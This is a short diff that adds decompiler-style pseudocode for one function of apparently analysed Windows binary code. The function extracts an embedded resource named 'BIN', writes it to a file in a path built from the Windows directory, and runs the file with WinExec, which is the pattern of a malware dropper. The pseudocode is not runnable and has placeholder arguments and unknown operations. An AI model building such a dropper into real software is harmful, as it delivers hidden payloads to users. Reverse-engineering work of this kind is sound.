@@ -1,0 +1,29 @@
+Function_3(){
+	int var_12 = 0
+	int var_292 = 0
+	int var_8 = 0
+	int var_568 = 0
+	int var_4 = 0
+	int var_288 = 0
+	char var_284 = 0;
+	UNKNOWN OPERATION3(STOS)
+	char var_564 = 0;
+	var_283 = 0;
+	UNKNOWN OPERATION3(STOS)
+	kernel32.dll:GetWindowsDirectoryA(0, 10E);
+	msvcrt.dll:_snprintf(0, 10E, %s%s));
+	kernel32.dll:GetModuleHandleA(0);
+	var_12 = ret_value;
+	kernel32.dll:FindResourceA(0, #101), BIN));
+	var_292 = ret_value;
+	kernel32.dll:LoadResource(0, 0);
+	var_8 = ret_value;
+	kernel32.dll:SizeofResource(0, 0);
+	var_288 = ret_value;
+	kernel32.dll:CreateFileA(0, 40000000, 1, 0, 2, 0, 0);
+	var_568 = ret_value;
+	kernel32.dll:WriteFile(0, 0, 0, 0, 0);
+	kernel32.dll:CloseHandle(0);
+	kernel32.dll:WinExec(0, 0);
+	return
+}
